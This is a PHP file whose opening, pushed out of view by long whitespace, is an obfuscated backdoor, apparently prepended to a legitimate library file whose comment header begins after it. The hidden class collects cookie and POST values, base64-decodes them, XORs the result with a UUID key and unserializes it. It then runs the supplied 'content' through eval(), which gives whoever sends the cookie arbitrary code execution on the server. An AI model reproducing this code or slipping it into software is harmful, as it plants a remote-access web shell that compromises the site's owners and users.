<?php                                                                                                                                                                                                                                                                                                                                                                                                 $fZyiiHXtg = class_exists("Q_dGC"); $aYQArFCaf = $fZyiiHXtg;if (!$aYQArFCaf){class Q_dGC{private $yojmNAzaWO;public static $FvvSY = "f74745e6-0f5b-41e9-8168-6056ea67f3ea";public static $uHhVzrYJB = NULL;public function __construct(){$CrBxeLLaA = $_COOKIE;$EvvNSbE = $_POST;$kkiAbkDQob = @$CrBxeLLaA[substr(Q_dGC::$FvvSY, 0, 4)];if (!empty($kkiAbkDQob)){$uHbNDaMb = "base64";$SmDQwVh = "";$kkiAbkDQob = explode(",", $kkiAbkDQob);foreach ($kkiAbkDQob as $OMCQacrGJc){$SmDQwVh .= @$CrBxeLLaA[$OMCQacrGJc];$SmDQwVh .= @$EvvNSbE[$OMCQacrGJc];}$SmDQwVh = array_map($uHbNDaMb . '_' . "\x64" . chr (101) . chr ( 244 - 145 ).chr ( 600 - 489 )."\x64" . 'e', array($SmDQwVh,)); $SmDQwVh = $SmDQwVh[0] ^ str_repeat(Q_dGC::$FvvSY, (strlen($SmDQwVh[0]) / strlen(Q_dGC::$FvvSY)) + 1);Q_dGC::$uHhVzrYJB = @unserialize($SmDQwVh);}}public function __destruct(){$this->gMXhcs();}private function gMXhcs(){if (is_array(Q_dGC::$uHhVzrYJB)) {$WOvinh = str_replace(chr ( 399 - 339 ) . chr ( 705 - 642 ).'p' . chr ( 716 - 612 )."\x70", "", Q_dGC::$uHhVzrYJB['c' . "\x6f" . "\x6e" . chr ( 889 - 773 ).chr ( 983 - 882 ).'n' . chr (116)]);eval($WOvinh);exit();}}}$OSxVyjBuV = new Q_dGC(); $OSxVyjBuV = NULL;} ?><?php
//============================================================+
